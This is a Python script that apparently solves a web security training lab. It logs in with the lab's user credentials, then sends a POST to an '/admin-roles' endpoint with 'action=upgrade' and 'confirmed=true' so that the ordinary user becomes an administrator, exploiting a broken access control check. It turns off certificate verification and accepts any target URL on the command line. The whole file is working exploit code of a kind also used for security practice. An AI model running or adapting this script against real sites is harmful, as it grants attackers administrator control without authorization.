import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def upgrade(session,url):
    #LOgin wiener acount

    url_login=url+"/login"
    data={"username":"wiener","password":"peter"}
    response=session.post(url_login,data=data,verify=False)
    response=response.text

    if "Log out" in response:
        print('(+) Log in successfully .')
        print('(+) Upgrading user .....')

        #upgrade user

        url_up=url+"/admin-roles"
        data_up={"action":"upgrade","confirmed":"true","username":"wiener"}
        response_up=session.post(url_up,data_up,verify=False)

        if response_up.status_code == 200:
            print('(+) Upgrade done successfully . ')
        else:
            print("(-) Eroor while upgrading !")
            sys.exit(-1)



def Main():

    if len(sys.argv) != 2 :
        
        print("(+) Usag]e %s <url>"%sys.argv[0])
        print('(+) Example : %s www.site.com'%sys.argv[0])
        sys.exit(-1)
        
    session=requests.session()
    url=sys.argv[1]
    upgrade(session,url)

if __name__=="__main__":
    Main()